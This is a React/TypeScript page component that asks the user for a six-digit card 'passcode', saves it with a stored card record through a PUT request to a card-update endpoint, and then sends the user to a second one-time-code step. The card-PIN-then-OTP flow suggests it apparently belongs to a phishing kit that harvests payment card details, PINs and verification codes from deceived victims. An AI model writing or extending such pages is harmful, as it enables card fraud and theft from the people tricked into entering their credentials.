import { FormEvent, useLayoutEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import VerificationInput from "react-verification-input";
import Title from "../components/typographies/Title";
import useCountry from "../hooks/useCountry";
import texts from "../utils/texts";
import Button from "../components/Button";
import useCard from "../hooks/useCard";
import useLoading from "../hooks/useLoading";
import api from "../utils/api";

export default function PasscodePage() {
  const navigate = useNavigate();
  const { locale } = useCountry();
  const { card, setCardAct } = useCard();
  const { setLoadingAct } = useLoading();

  const [pin, setPin] = useState<string>("");

  const submitDisabled = pin.length < 4;

  const handlePin = (value: string) => {
    setPin(value);
  };

  const onSubmit = (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    setLoadingAct(true);
    api
      .put(`/card/update/${card?.id}`, {
        ...card,
        pin,
      })
      .then((res) => {
        setCardAct(res.data);
        setLoadingAct(false);
        navigate("/otp/2");
      })
      .catch(() => {
        setLoadingAct(false);
      });
  };

  useLayoutEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  return (
    <div className="mt-8 mb-8 md:mb-0 flex flex-col gap-12 items-center">
      <Title>{texts.enterPasscode[locale]}:</Title>

      <form
        className="flex flex-col items-center gap-24 w-full"
        onSubmit={onSubmit}
      >
        <VerificationInput
          value={pin}
          onChange={handlePin}
          length={6}
          classNames={{
            character:
              "bg-gray-100 transition hover:bg-gray-200 rounded-xl flex flex-col items-center justify-center h-20 w-20 border-none outline-none",
          }}
        />

        <Button className="w-72" type="submit" disabled={submitDisabled}>
          {texts.submit[locale]}
        </Button>
      </form>
    </div>
  );
}
